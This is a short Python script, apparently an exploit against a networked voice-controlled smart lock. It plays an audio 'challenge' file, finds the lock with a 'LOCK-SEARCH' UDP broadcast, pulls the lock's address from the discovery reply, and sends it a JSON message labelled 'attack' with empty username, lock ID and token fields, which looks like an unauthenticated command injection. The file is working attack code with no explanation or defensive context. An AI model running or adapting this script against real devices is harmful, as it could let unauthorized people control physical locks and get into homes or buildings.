import socket
import json
import simpleaudio as sa

filename = 'challenge.wav'
wave_obj = sa.WaveObject.from_wave_file(filename)
play_obj = wave_obj.play()
play_obj.wait_done()  # Wait until sound has finished playing

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.sendto("LOCK-SEARCH".encode(), ('255.255.255.255', 1901))


buf, address = s.recvfrom(2048)
data = buf.decode()
print("Received from %s: %s" % (address, data))
if "Touch Voice SSDP Standard Response" in data:
    ip = data[data.find('//') + len('//'):data.find('::')]
    port = int(data[data.find('::') + len('::'):data.find('|')])
    print(ip, port)
    Client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_sock.connect((ip, port))
    message = json.dumps({
        "PAGEID": "attack",
        "USERNAME": "",
        "LOCKID": "",
        "TOKEN": "",
        "MEMBERLIST": "[1]",
        "DATASTART": "[2]",
        "DATAEND": "[3]",
        "DATALIST": "[4]",
        "IsOver": "True"
    })
    Client_sock.send(message.encode())
    Client_sock.close()
